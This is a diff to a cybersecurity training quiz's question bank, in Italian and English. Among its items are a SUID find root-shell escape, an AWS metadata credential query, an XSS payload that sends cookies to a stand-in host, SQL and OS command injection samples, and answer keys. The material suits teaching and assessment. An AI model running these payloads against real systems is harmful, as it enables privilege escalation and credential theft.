+    commandTarget: 'find . -exec /bin/sh -p \\;',
+    commandChips: ['. -exec /bin/sh -p \\;', '. -name "*.txt" -delete', '. -perm -4000 -ls', '. -type f -exec whoami \\;'],
+    options: [
+      { id: 'af_1', text: '. -exec /bin/sh -p \\;', isCorrect: true, explanation: 'The -p flag preserves elevated SUID root privileges in the spawned shell.' },
+      { id: 'af_2', text: '. -name "*.txt" -delete', isCorrect: false },
+      { id: 'af_3', text: '. -perm -4000 -ls', isCorrect: false },
+      { id: 'af_4', text: '. -type f -exec whoami \\;', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'GTFOBins: SUID find Execution Flow Hijacking',
+      whyItWorks: 'The find command executes arguments via execve under effective root UID when the SUID bit is active.',
+      patchRecommendation: 'Remove unnecessary SUID bits across administrative utilities with `chmod u-s /usr/bin/find`.',
+      terminalProof: '$ find . -exec /bin/sh -p \\;\n# whoami\nroot'
+    },
+    xpReward: 75,
+    eloReward: 38
+  },
+  {
+    id: 'diag_adv_term_curl',
+    title: 'Terminal Sandbox: Cloud Metadata SSRF',
+    type: 'terminal_command',
+    domain: 'Web Sec',
+    difficulty: 'Zero-Day',
+    prompt: 'Use `curl` to query the link-local AWS IMDSv1 endpoint for attached security credential roles:',
+    terminalPrompt: 'operator@zeroday:~$',
+    commandPrefix: 'curl',
+    commandTarget: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    commandChips: [
+      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+      'https://api.aws.amazon.com/v1/iam/security-credentials/',
+      '-H "Host: metadata" http://127.0.0.1/latest/meta-data/',
+      'http://10.0.0.1/aws/meta-data/iam/credentials'
+    ],
+    options: [
+      { id: 'ac_1', text: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', isCorrect: true, explanation: 'Queries the default cloud link-local metadata address (169.254.169.254) for IAM roles.' },
+      { id: 'ac_2', text: 'https://api.aws.amazon.com/v1/iam/security-credentials/', isCorrect: false },
+      { id: 'ac_3', text: '-H "Host: metadata" http://127.0.0.1/latest/meta-data/', isCorrect: false },
+      { id: 'ac_4', text: 'http://10.0.0.1/aws/meta-data/iam/credentials', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'AWS IMDSv1 Link-Local Exfiltration (CWE-918)',
+      whyItWorks: 'IMDSv1 issues credentials to any unauthenticated local HTTP client querying link-local address 169.254.169.254.',
+      patchRecommendation: 'Migrate immediately to IMDSv2 and configure hop-count limits on AWS EC2 network interfaces.',
+      terminalProof: '$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nEC2-Production-Role'
+    },
+    xpReward: 75,
+    eloReward: 38
   }
 ];
 
@@ -443,10 +604,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Perché l\'autenticazione a due fattori (MFA) è fondamentale anche se si usa una password complessa?',
     codeSnippet: 'TENTATIVO DI ACCESSO:\nUsername: admin\nPassword: ********** [CORRETTA]\nCodice OTP MFA: ???',
     options: [
-      { id: 'bm_opt1', text: 'Blocca l\'accesso anche se la password viene rubata in un leak', isCorrect: true, explanation: 'L\'MFA richiede una seconda prova di identità (token TOTP), impedendo l\'uso illecito delle credenziali.' },
-      { id: 'bm_opt2', text: 'Velocizza il download della connessione internet', isCorrect: false },
-      { id: 'bm_opt3', text: 'Elimina del tutto la necessità di avere un antivirus', isCorrect: false },
-      { id: 'bm_opt4', text: 'Formatta automaticamente la memoria RAM a ogni riavvio', isCorrect: false }
+      { id: 'bm_opt1', text: 'Blocca l\'accesso abusivo anche se le password vengono sottratte nei data breach', isCorrect: true, explanation: 'L\'MFA richiede una seconda prova di identità (token TOTP), impedendo l\'uso illecito delle credenziali.' },
+      { id: 'bm_opt2', text: 'Velocizza i tempi di trasmissione della banda durante le sessioni di navigazione', isCorrect: false },
+      { id: 'bm_opt3', text: 'Elimina l\'esigenza di installare antivirus per la protezione degli endpoint aziendali', isCorrect: false },
+      { id: 'bm_opt4', text: 'Cifra direttamente i settori del disco locale impedendo analisi forensi offline', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Linee Guida Identità Digitale NIST SP 800-63B',
@@ -467,9 +628,9 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     codeSnippet: 'MITTENTE: Team Sicurezza <alert@aggiornamento-sistema.org>\nAZIONE RICHIESTA: Verifica subito le tue credenziali',
     options: [
       { id: 'bp_opt1', text: 'https://login-micros0ft.supporto-verifica.com', isCorrect: true, explanation: 'Il dominio effettivo è supporto-verifica.com con un sottodominio fraudolento che imita Microsoft.' },
-      { id: 'bp_opt2', text: 'https://account.microsoft.com/security', isCorrect: false },
-      { id: 'bp_opt3', text: 'https://login.live.com/oauth2', isCorrect: false },
-      { id: 'bp_opt4', text: 'https://portal.office.com/landing', isCorrect: false }
+      { id: 'bp_opt2', text: 'https://account.microsoft.com/security-auth', isCorrect: false },
+      { id: 'bp_opt3', text: 'https://login.live.com/oauth2-token-exchange', isCorrect: false },
+      { id: 'bp_opt4', text: 'https://portal.office.com/landing-protection', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'MITRE ATT&CK T1566: Phishing & Typo-Squatting',
@@ -489,10 +650,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Cosa stabilisce il Principio del Minimo Privilegio (Principle of Least Privilege)?',
     codeSnippet: 'MATRICE PRIVILEGI:\nOperatore: Sviluppatore Junior\nRichiesto: Domain Admin (Root Totale)\nPolicy di Sicurezza: ???',
     options: [
-      { id: 'bl_opt1', text: 'Assegnare solo i permessi strettamente necessari alle proprie mansioni', isCorrect: true, explanation: 'Limitare i permessi riduce il raggio d\'impatto nel caso in cui un singolo account venga violato.' },
-      { id: 'bl_opt2', text: 'Concedere accesso di root amministratore a qualsiasi dipendente', isCorrect: false },
-      { id: 'bl_opt3', text: 'Condividere una singola password master per tutti gli uffici', isCorrect: false },
-      { id: 'bl_opt4', text: 'Disattivare i firewall per non rallentare il lavoro di programmazione', isCorrect: false }
+      { id: 'bl_opt1', text: 'Assegnare esclusivamente i permessi minimi indispensabili per le proprie mansioni', isCorrect: true, explanation: 'Limitare i permessi riduce il raggio d\'impatto nel caso in cui un singolo account venga violato.' },
+      { id: 'bl_opt2', text: 'Promuovere tutti gli account aziendali a livello di amministratori di dominio globale', isCorrect: false },
+      { id: 'bl_opt3', text: 'Distribuire una credenziale master condivisa per l\'accesso all\'intero dipartimento', isCorrect: false },
+      { id: 'bl_opt4', text: 'Disattivare i firewall perimetrali per ottimizzare i flussi di lavoro ingegneristici', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Principio del Minimo Privilegio (PoLP)',
@@ -512,10 +673,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Ricevi un archivio inatteso via email. Quale nome di file nasconde un payload eseguibile malevolo?',
     codeSnippet: 'CONTENUTO ARCHIVIO:\n[1] README.txt\n[2] Contratto.pdf\n[3] Fattura_Pagamento.pdf.exe\n[4] Logo.png',
     options: [
-      { id: 'bx_opt1', text: 'Fattura_Pagamento.pdf.exe (payload eseguibile)', isCorrect: true, explanation: 'La doppia estensione inganna l\'utente mentre Windows esegue il file come programma PE.' },
-      { id: 'bx_opt2', text: 'Contratto.pdf (documento)', isCorrect: false },
-      { id: 'bx_opt3', text: 'README.txt (file di testo)', isCorrect: false },
-      { id: 'bx_opt4', text: 'Logo.png (immagine)', isCorrect: false }
+      { id: 'bx_opt1', text: 'Fattura_Pagamento_2026.pdf.exe', isCorrect: true, explanation: 'La doppia estensione inganna l\'utente mentre Windows esegue il file come programma PE.' },
+      { id: 'bx_opt2', text: 'Contratto_Assunzione_2026.pdf', isCorrect: false },
+      { id: 'bx_opt3', text: 'Riepilogo_Trimestrale_Doc.txt', isCorrect: false },
+      { id: 'bx_opt4', text: 'Identita_Aziendale_Logo.png', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Doppia Estensione Masquerading (MITRE T1036.007)',
@@ -535,10 +696,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Qual è la funzione operativa fondamentale di un firewall di rete aziendale?',
     codeSnippet: 'PACCHETTO IN ENTRATA -> [REGOLE ACL FIREWALL] -> SERVER AZIENDALE',
     options: [
-      { id: 'bf_opt1', text: 'Filtrare e bloccare il traffico di rete non autorizzato', isCorrect: true, explanation: 'Il firewall ispeziona i pacchetti e scarta il traffico che viola le policy di sicurezza impostate.' },
-      { id: 'bf_opt2', text: 'Raddoppiare la velocità di download della fibra ottica', isCorrect: false },
-      { id: 'bf_opt3', text: 'Memorizzare i registri delle transazioni del database SQL', isCorrect: false },
-      { id: 'bf_opt4', text: 'Aggiornare automaticamente la cronologia del browser', isCorrect: false }
+      { id: 'bf_opt1', text: 'Ispezionare i pacchetti per scartare le connessioni di rete non autorizzate', isCorrect: true, explanation: 'Il firewall ispeziona i pacchetti e scarta il traffico che viola le policy di sicurezza impostate.' },
+      { id: 'bf_opt2', text: 'Memorizzare in cache risorse statiche per aumentare la velocita di download', isCorrect: false },
+      { id: 'bf_opt3', text: 'Cifrare i blocchi dei dischi fissi per prevenire duplicazioni fisiche illecite', isCorrect: false },
+      { id: 'bf_opt4', text: 'Distribuire le chiamate in ingresso in modo bilanciato sui server ridondati', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Stateful Packet Inspection (SPI)',
@@ -558,10 +719,10 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Come viene definita l\'Ingegneria Sociale (Social Engineering) nella sicurezza moderna?',
     codeSnippet: 'CHIAMATA: "Buongiorno, sono dell\'Helpdesk IT. Ho urgenza del suo PIN VPN per manutenzione."',
     options: [
-      { id: 'bs_opt1', text: 'Manipolazione psicologica per indurre la vittima a rivelare segreti', isCorrect: true, explanation: 'Gli attaccanti sfruttano fiducia, urgenza o autorità apparente invece di bug nel software.' },
-      { id: 'bs_opt2', text: 'Surriscaldamento dei componenti hardware nei server', isCorrect: false },
-      { id: 'bs_opt3', text: 'Compilazione automatizzata del kernel di Linux', isCorrect: false },
-      { id: 'bs_opt4', text: 'Misurazione della dispersione del segnale Wi-Fi a distanza', isCorrect: false }
+      { id: 'bs_opt1', text: 'Manipolazione psicologica mirata a indurre la vittima a rivelare informazioni riservate', isCorrect: true, explanation: 'Gli attaccanti sfruttano fiducia, urgenza o autorità apparente invece di bug nel software.' },
+      { id: 'bs_opt2', text: 'Analisi di reverse engineering sui binari compilati per scoprire buffer overflow nello stack', isCorrect: false },
+      { id: 'bs_opt3', text: 'Iniezione di disturbi elettrici sul clock di sicurezza dei circuiti integrati crittografici', isCorrect: false },
+      { id: 'bs_opt4', text: 'Saturazione delle tabelle MAC degli apparati di commutazione mediante traffico broadcast', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Ingegneria Sociale & Pretexting (MITRE T1566)',
@@ -571,6 +732,58 @@ export const BEGINNER_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     },
     xpReward: 30,
     eloReward: 15
+  },
+  {
+    id: 'diag_beg_term_whoami',
+    title: 'Terminale Interattivo: Verifica Identità Operatore',
+    type: 'terminal_command',
+    domain: 'Linux & Bash',
+    difficulty: 'Beginner',
+    prompt: 'In un terminale Linux aperto, individua lo username della sessione utente attualmente attiva:',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: '',
+    commandTarget: 'whoami',
+    commandChips: ['whoami', 'id', 'uname -a', 'pwd', 'ls -la'],
+    options: [
+      { id: 'bw_1', text: 'whoami', isCorrect: true, explanation: 'Mostra lo username effettivo associato alla sessione corrente.' },
+      { id: 'bw_2', text: 'pwd', isCorrect: false },
+      { id: 'bw_3', text: 'uname -a', isCorrect: false },
+      { id: 'bw_4', text: 'ls -la', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Gestione Identità & Sessioni Linux',
+      whyItWorks: 'Il comando whoami legge l\'UID effettivo della shell in esecuzione e ne stampa il nome account.',
+      patchRecommendation: 'Verificare sempre l\'identità prima di lanciare script con privilegi elevati di root.',
+      terminalProof: '$ whoami\nroot'
+    },
+    xpReward: 35,
+    eloReward: 18
+  },
+  {
+    id: 'diag_beg_term_ping',
+    title: 'Terminale Interattivo: Verifica Connettività ICMP',
+    type: 'terminal_command',
+    domain: 'Networking',
+    difficulty: 'Beginner',
+    prompt: 'Invia esattamente 4 pacchetti ICMP Echo Request per testare la raggiungibilità del DNS Google (8.8.8.8):',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: 'ping',
+    commandTarget: 'ping -c 4 8.8.8.8',
+    commandChips: ['-c 4 8.8.8.8', '-t 4 8.8.8.8', '8.8.8.8 -n 4', '--count 4 8.8.8.8'],
+    options: [
+      { id: 'bp_1', text: '-c 4 8.8.8.8', isCorrect: true, explanation: 'L\'opzione -c specifica il conteggio esatto di pacchetti ICMP da trasmettere su Linux.' },
+      { id: 'bp_2', text: '-t 4 8.8.8.8', isCorrect: false },
+      { id: 'bp_3', text: '8.8.8.8 -n 4', isCorrect: false },
+      { id: 'bp_4', text: '--count 4 8.8.8.8', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'RFC 792 Protocollo ICMP e Diagnostica di Rete',
+      whyItWorks: 'Ping invia pacchetti ICMP Tipo 8 (Echo Request) e attende risposte Tipo 0 per valutare latenza e perdita pacchetti.',
+      patchRecommendation: 'Limitare il traffico ICMP in ingresso sui firewall perimetrali per contrastare la ricognizione host.',
+      terminalProof: '$ ping -c 4 8.8.8.8\n4 packets transmitted, 4 received, 0% packet loss'
+    },
+    xpReward: 35,
+    eloReward: 18
   }
 ];
 
@@ -584,10 +797,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Analizza la richiesta HTTP. Quale payload provoca il bypass dell\'autenticazione?',
     codeSnippet: 'POST /api/v1/auth/session HTTP/1.1\n{"username": "admin\' OR 1=1-- -", "pass": "x"}',
     options: [
-      { id: 'i1_opt1', text: 'Tautologia: "OR 1=1" rende la clausola WHERE sempre VERA', isCorrect: true, explanation: 'La tautologia forza la query a restituire vero e il commento esclude il controllo password.' },
-      { id: 'i1_opt2', text: 'La chiave "pass" viene saltata via HTTP smuggling', isCorrect: false },
-      { id: 'i1_opt3', text: 'La porta 8443 trasmette cookie di sessione in chiaro', isCorrect: false },
-      { id: 'i1_opt4', text: 'L\'header Content-Length provoca un buffer overflow', isCorrect: false }
+      { id: 'i1_opt1', text: 'La tautologia "OR 1=1" forza la clausola WHERE a restituire sempre VERO', isCorrect: true, explanation: 'La tautologia forza la query a restituire vero e il commento esclude il controllo password.' },
+      { id: 'i1_opt2', text: 'La serializzazione JSON corrotta scavalca il modulo di cifratura interna', isCorrect: false },
+      { id: 'i1_opt3', text: 'Il cookie di sessione non cifrato espone il token in chiaro sul socket', isCorrect: false },
+      { id: 'i1_opt4', text: 'Il campo Content-Length anomalo scatena un crash di buffer overflow', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-89: SQL Injection',
@@ -607,10 +820,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Durante una scansione SYN (-sS), la porta risponde con [RST, ACK]. Cosa indica questo stato?',
     codeSnippet: 'FRAME: TCP 10.10.10.50:443 -> 192.168.1.15\nFlags: [RST, ACK], Seq=0, Ack=1',
     options: [
-      { id: 'i2_opt1', text: 'CHIUSA (Host raggiungibile, ma rifiuta attivamente la connessione)', isCorrect: true, explanation: 'Un pacchetto RST/ACK indica che il sistema operativo riceve ma non ha servizi in ascolto su quella porta.' },
-      { id: 'i2_opt2', text: 'APERTA (In attesa del ClientHello TLS)', isCorrect: false },
-      { id: 'i2_opt3', text: 'FILTRATA (Il firewall ha scartato i pacchetti)', isCorrect: false },
-      { id: 'i2_opt4', text: 'Attacco ARP spoofing rilevato in tempo reale', isCorrect: false }
+      { id: 'i2_opt1', text: 'CHIUSA: Il sistema operativo è attivo ma rifiuta con reset la connessione', isCorrect: true, explanation: 'Un pacchetto RST/ACK indica che il sistema operativo riceve ma non ha servizi in ascolto su quella porta.' },
+      { id: 'i2_opt2', text: 'APERTA: Il demone di rete è in ascolto e attende il pacchetto ClientHello TLS', isCorrect: false },
+      { id: 'i2_opt3', text: 'FILTRATA: Il firewall perimetrale ha scartato silenziosamente la sonda TCP', isCorrect: false },
+      { id: 'i2_opt4', text: 'SPOOFATA: Una risposta ARP non richiesta ha corrotto la tabella dell\'interfaccia', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Stati Porte RFC 793 TCP',
@@ -630,10 +843,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Perché il binario mostrato consente la privilege escalation a root?',
     codeSnippet: '$ ls -la /usr/bin/find\n-rwsr-xr-x 1 root root 224840 May 12 /usr/bin/find',
     options: [
-      { id: 'i3_opt1', text: 'Bit SUID attivo ("s"): esegue comandi con UID di root', isCorrect: true, explanation: 'Il permesso SUID fa girare il binario con i privilegi del proprietario (root).' },
-      { id: 'i3_opt2', text: 'Il file è scrivibile liberamente da chiunque', isCorrect: false },
-      { id: 'i3_opt3', text: 'Binario cifrato decifrabile solo dal kernel', isCorrect: false },
-      { id: 'i3_opt4', text: 'Permessi di sola esecuzione impediscono il reverse engineering', isCorrect: false }
+      { id: 'i3_opt1', text: 'Bit SUID attivo ("s"): l\'eseguibile gira sotto l\'UID effettivo di root', isCorrect: true, explanation: 'Il permesso SUID fa girare il binario con i privilegi del proprietario (root).' },
+      { id: 'i3_opt2', text: 'Permessi di scrittura aperti a tutti consentono di sovrascrivere lo script', isCorrect: false },
+      { id: 'i3_opt3', text: 'Binario protetto decifrabile esclusivamente mediante il keyring del kernel', isCorrect: false },
+      { id: 'i3_opt4', text: 'Attributi di sola esecuzione inibiscono l\'aggancio di debugger dinamici', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Privilege Escalation SUID (GTFOBins)',
@@ -653,10 +866,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Quale difetto permette a un attaccante di falsificare un JSON Web Token (JWT)?',
     codeSnippet: 'HEADER: {"alg": "none", "typ": "JWT"}\nPAYLOAD: {"user": "admin", "role": "root"}',
     options: [
-      { id: 'i4_opt1', text: 'Accettazione di "alg": "none" che salta la verifica della firma', isCorrect: true, explanation: 'L\'algoritmo "none" istruisce le librerie vulnerabili a non verificare alcuna firma.' },
-      { id: 'i4_opt2', text: 'Il payload è memorizzato in chiaro in Base64', isCorrect: false },
-      { id: 'i4_opt3', text: 'Mancanza della data di scadenza "exp"', isCorrect: false },
-      { id: 'i4_opt4', text: 'Chiavi HMAC che richiedono certificati pubblici RSA', isCorrect: false }
+      { id: 'i4_opt1', text: 'Accettare "alg": "none" induce il parser a saltare la validazione della firma', isCorrect: true, explanation: 'L\'algoritmo "none" istruisce le librerie vulnerabili a non verificare alcuna firma.' },
+      { id: 'i4_opt2', text: 'La codifica Base64 del payload memorizza le credenziali utente in chiaro', isCorrect: false },
+      { id: 'i4_opt3', text: 'L\'assenza del campo di scadenza "exp" mantiene il token perennemente attivo', isCorrect: false },
+      { id: 'i4_opt4', text: 'L\'algoritmo HMAC necessita obbligatoriamente di certificati pubblici RSA', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Vulnerabilità Alg None RFC 7519',
@@ -676,10 +889,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Cosa differenzia una vulnerabilità Stored XSS da una Reflected XSS?',
     codeSnippet: 'STORED: <script>fetch("http://hacker.xyz/?c="+document.cookie)</script>',
     options: [
-      { id: 'i5_opt1', text: 'Il payload è salvato nel database ed è eseguito da tutti i visitatori', isCorrect: true, explanation: 'La Stored XSS risiede nel server e colpisce chiunque visiti la pagina infetta.' },
-      { id: 'i5_opt2', text: 'La Stored XSS funziona solo all\'interno della console di sviluppo', isCorrect: false },
-      { id: 'i5_opt3', text: 'La Reflected XSS modifica permanentemente i file del server', isCorrect: false },
-      { id: 'i5_opt4', text: 'La Stored XSS viene bloccata automaticamente dai certificati TLS', isCorrect: false }
+      { id: 'i5_opt1', text: 'Il payload risiede nel database backend e colpisce qualsiasi visitatore', isCorrect: true, explanation: 'La Stored XSS risiede nel server e colpisce chiunque visiti la pagina infetta.' },
+      { id: 'i5_opt2', text: 'Lo script si attiva solo all\'interno della console di sviluppo del client', isCorrect: false },
+      { id: 'i5_opt3', text: 'Il codice malevolo sovrascrive in modo permanente i file del server host', isCorrect: false },
+      { id: 'i5_opt4', text: 'L\'attacco viene filtrato automaticamente dai certificati crittografici TLS', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-79: Cross-Site Scripting (XSS)',
@@ -699,10 +912,10 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'In notazione CIDR standard, quanti indirizzi host assegnabili ci sono in una subnet /24?',
     codeSnippet: 'NETWORK: 192.168.1.0/24\nNETMASK: 255.255.255.0',
     options: [
-      { id: 'i6_opt1', text: '254 host utilizzabili (256 meno rete e broadcast)', isCorrect: true, explanation: 'Una /24 ha 256 indirizzi; sottraendo l\'indirizzo di rete (.0) e quello di broadcast (.255) rimangono 254.' },
-      { id: 'i6_opt2', text: '256 host utilizzabili', isCorrect: false },
-      { id: 'i6_opt3', text: '512 host utilizzabili', isCorrect: false },
-      { id: 'i6_opt4', text: '128 host utilizzabili', isCorrect: false }
+      { id: 'i6_opt1', text: '254 host IP assegnabili', isCorrect: true, explanation: 'Una /24 ha 256 indirizzi; sottraendo l\'indirizzo di rete (.0) e quello di broadcast (.255) rimangono 254.' },
+      { id: 'i6_opt2', text: '256 host IP assegnabili', isCorrect: false },
+      { id: 'i6_opt3', text: '252 host IP assegnabili', isCorrect: false },
+      { id: 'i6_opt4', text: '128 host IP assegnabili', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'RFC 4632 Classless Inter-Domain Routing',
@@ -712,6 +925,58 @@ export const INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     },
     xpReward: 50,
     eloReward: 25
+  },
+  {
+    id: 'diag_int_term_nmap',
+    title: 'Terminale Interattivo: Ricognizione Stealth Porte',
+    type: 'terminal_command',
+    domain: 'Networking',
+    difficulty: 'Intermediate',
+    prompt: 'Esegui una scansione TCP SYN stealth (-sS) sulle porte 80 e 443 dell\'host target 192.168.1.10:',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: 'nmap',
+    commandTarget: 'nmap -sS -p 80,443 192.168.1.10',
+    commandChips: ['-sS -p 80,443 192.168.1.10', '-sT -p 80,443 192.168.1.10', '-sU -p 80,443 192.168.1.10', '-p 80,443 -A 192.168.1.10'],
+    options: [
+      { id: 'in_1', text: '-sS -p 80,443 192.168.1.10', isCorrect: true, explanation: 'L\'opzione -sS avvia una scansione TCP SYN half-open senza completare il 3-way handshake.' },
+      { id: 'in_2', text: '-sT -p 80,443 192.168.1.10', isCorrect: false },
+      { id: 'in_3', text: '-sU -p 80,443 192.168.1.10', isCorrect: false },
+      { id: 'in_4', text: '-p 80,443 -A 192.168.1.10', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Meccanismi di Scansione TCP SYN (Half-Open)',
+      whyItWorks: 'Le scansioni SYN evitano l\'apertura completa del socket TCP abbattendo la sessione con un RST al ricevimento del SYN/ACK.',
+      patchRecommendation: 'Configurare apparati IDS/IPS per rilevare anomalie nel rapporto tra tentativi SYN e completamenti ACK.',
+      terminalProof: '$ nmap -sS -p 80,443 192.168.1.10\n80/tcp  open  http\n443/tcp open  ssl/https'
+    },
+    xpReward: 55,
+    eloReward: 28
+  },
+  {
+    id: 'diag_int_term_grep',
+    title: 'Terminale Interattivo: Estrazione Credenziali nei Log',
+    type: 'terminal_command',
+    domain: 'Defense & SOC',
+    difficulty: 'Intermediate',
+    prompt: 'Cerca in modo case-insensitive (-i) credenziali esposte contenenti "DATABASE_URL" in config.json:',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: 'grep',
+    commandTarget: 'grep -i "DATABASE_URL" config.json',
+    commandChips: ['-i "DATABASE_URL" config.json', '-v "DATABASE_URL" config.json', '-c "DATABASE_URL" config.json', '-n "DATABASE_URL" --binary config.json'],
+    options: [
+      { id: 'ig_1', text: '-i "DATABASE_URL" config.json', isCorrect: true, explanation: 'L\'opzione -i ignora maiuscole e minuscole durante la corrispondenza dei pattern.' },
+      { id: 'ig_2', text: '-v "DATABASE_URL" config.json', isCorrect: false },
+      { id: 'ig_3', text: '-c "DATABASE_URL" config.json', isCorrect: false },
+      { id: 'ig_4', text: '-n "DATABASE_URL" --binary config.json', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Analisi Forense dei Log e Pattern Matching',
+      whyItWorks: 'Grep analizza flussi testuali con espressioni regolari consentendo l\'identificazione immediata di segreti trapelati.',
+      patchRecommendation: 'Integrare scanner come GitLeaks per bloccare il commit di token e credenziali nei repository.',
+      terminalProof: '$ grep -i "DATABASE_URL" config.json\nDATABASE_URL: mysql://db_admin:P@ssw0rd123!@10.0.0.50:3306/prod'
+    },
+    xpReward: 55,
+    eloReward: 28
   }
 ];
 
@@ -725,10 +990,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Cambiando `user_id=104` in `user_id=1` in una chiamata API, ricevi il cedolino del CEO. Di quale falla si tratta?',
     codeSnippet: 'GET /api/v2/payroll?user_id=1 HTTP/1.1\nCookie: session=operator_104_token\n\nHTTP/1.1 200 OK\n{"salary": 250000, "name": "CEO"}',
     options: [
-      { id: 'a1_opt1', text: 'IDOR: Mancanza di controllo di autorizzazione lato server', isCorrect: true, explanation: 'Il server si fida dell\'ID passato senza verificare se l\'utente autenticato ne sia il legittimo proprietario.' },
-      { id: 'a1_opt2', text: 'Reflected Cross-Site Scripting (XSS) nella query string', isCorrect: false },
-      { id: 'a1_opt3', text: 'SQL Injection durante il parsing del corpo JSON', isCorrect: false },
-      { id: 'a1_opt4', text: 'Buffer overflow sul registro dello stack pointer', isCorrect: false }
+      { id: 'a1_opt1', text: 'IDOR: Il server omette il controllo di autorizzazione sull\'identificativo utente', isCorrect: true, explanation: 'Il server si fida dell\'ID passato senza verificare se l\'utente autenticato ne sia il legittimo proprietario.' },
+      { id: 'a1_opt2', text: 'SQLi: Parametro intero non sanificato concatenato nella logica del database SQL', isCorrect: false },
+      { id: 'a1_opt3', text: 'XSS: Payload riflesso renderizzato senza applicare l\'escaping delle entita HTML', isCorrect: false },
+      { id: 'a1_opt4', text: 'CSRF: Richiesta con mutazione di stato accettata senza validare token anti-falsificazione', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-639: Insecure Direct Object Reference (IDOR)',
@@ -748,10 +1013,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Perché lo script PHP consente l\'esecuzione arbitraria di comandi di sistema (RCE)?',
     codeSnippet: '<?php\n$host = $_GET["target"];\nsystem("ping -c 2 " . $host);\n?>',
     options: [
-      { id: 'a2_opt1', text: 'Input non sanificato passato a system() consente il concatenation (es. ; id)', isCorrect: true, explanation: 'I metacaratteri shell come ; & | permettono di accodare ed eseguire comandi arbitrari sul server.' },
-      { id: 'a2_opt2', text: 'Caricamento file senza validazione del tipo MIME', isCorrect: false },
-      { id: 'a2_opt3', text: 'Deserializzazione insicura di oggetti pickle in Python', isCorrect: false },
-      { id: 'a2_opt4', text: 'Corruzione della memoria tramite stringhe di formato printf', isCorrect: false }
+      { id: 'a2_opt1', text: 'L\'input passato a system() consente di concatenare comandi di shell come "; id"', isCorrect: true, explanation: 'I metacaratteri shell come ; & | permettono di accodare ed eseguire comandi arbitrari sul server.' },
+      { id: 'a2_opt2', text: 'Il caricamento di file privo di controllo MIME genera una web shell eseguibile', isCorrect: false },
+      { id: 'a2_opt3', text: 'La deserializzazione insicura di oggetti istanzia gadget malevoli in memoria', isCorrect: false },
+      { id: 'a2_opt4', text: 'Lo specificatore di formato in printf corrompe i puntatori arbitrari di memoria', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-78: OS Command Injection',
@@ -771,10 +1036,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'In un buffer overflow x86_64, quale registro della CPU viene sovrascritto per deviare l\'esecuzione?',
     codeSnippet: '[Buffer 64 bytes] -> [Saved RBP 8 bytes] -> [RET_ADDR (RIP)]',
     options: [
-      { id: 'a3_opt1', text: 'RIP (Instruction Pointer / Return Address)', isCorrect: true, explanation: 'Sovrascrivendo l\'indirizzo di ritorno, l\'istruzione RET caricherà in RIP l\'indirizzo scelto dall\'attaccante.' },
-      { id: 'a3_opt2', text: 'RSP (Stack Pointer)', isCorrect: false },
-      { id: 'a3_opt3', text: 'RAX (Accumulatore generico)', isCorrect: false },
